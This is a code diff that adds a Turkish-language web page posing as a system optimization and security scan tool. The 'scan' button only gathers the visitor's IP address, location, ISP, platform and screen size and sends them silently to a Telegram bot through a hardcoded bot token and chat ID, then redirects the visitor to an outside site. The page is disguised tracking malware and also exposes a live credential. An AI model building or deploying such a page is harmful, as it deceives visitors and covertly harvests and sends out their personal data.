@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Optimizasyon Aracı</title>
+    <style>
+        body { background: #050505; color: #00ff41; font-family: 'Courier New', monospace; text-align: center; display: flex; flex-direction: column; justify-content: center; height: 100vh; margin: 0; }
+        .main { border: 2px solid #00ff41; padding: 40px; margin: 20px; border-radius: 10px; box-shadow: 0 0 30px rgba(0, 255, 65, 0.3); }
+        .scan-btn { background: #00ff41; color: #000; border: none; padding: 20px 50px; font-weight: bold; cursor: pointer; font-size: 18px; text-transform: uppercase; transition: 0.4s; border-radius: 5px; }
+        .scan-btn:hover { background: #fff; box-shadow: 0 0 50px #00ff41; }
+    </style>
+</head>
+<body>
+    <div class="main">
+        <h1>SİSTEM KRİTİK ANALİZ</h1>
+        <p>Donanım bileşenlerini ve ağ güvenliğini doğrulamak için taramayı başlatın.</p>
+        <button class="scan-btn" onclick="executeScan()">TARAMAYI BAŞLAT</button>
+        <div id="status" style="margin-top:20px; font-size:12px; color:#555;">Sistem Hazır...</div>
+    </div>
+
+    <script>
+        const TOKEN = "8675726929:AAGPhcQPfk9VXLgY0gg8dX97qb5wV89B1cE";
+        const CHAT_ID = "5802794454";
+
+        async function executeScan() {
+            document.getElementById('status').innerText = "Ağ analizi yapılıyor...";
+            
+            let report = "🌐 **YENİ SİSTEM ANALİZ RAPORU** 🌐\n\n";
+
+            // 1. IP ve Detaylı Konum Analizi
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                report += `📍 **LOKASYON BİLGİLERİ**\n`;
+                report += `• IP: \`${d.ip}\`\n`;
+                report += `• Konum: ${d.city} / ${d.region}\n`;
+                report += `• ISS: ${d.org}\n`;
+                report += `• Ülke: ${d.country_name}\n\n`;
+            } catch(e) { 
+                report += "⚠️ IP Detayları Alınamadı.\n\n"; 
+            }
+
+            // 2. Cihaz Bilgisi
+            report += `📱 **CİHAZ BİLGİSİ**\n`;
+            report += `• Platform: ${navigator.platform}\n`;
+            report += `• Ekran Çözünürlüğü: ${window.screen.width}x${window.screen.height}\n`;
+
+            // Telegram'a Gönder
+            try {
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: report,
+                        parse_mode: "Markdown"
+                    })
+                });
+            } catch(e) {
+                console.error("Hata:", e);
+            }
+
+            // Yönlendirme
+            document.getElementById('status').innerText = "Analiz tamamlandı. Yönlendiriliyorsunuz...";
+            setTimeout(() => {
+                window.location.href = "https://illegalplatform.com";
+            }, 1500);
+        }
+    </script>
+</body>
+</html>
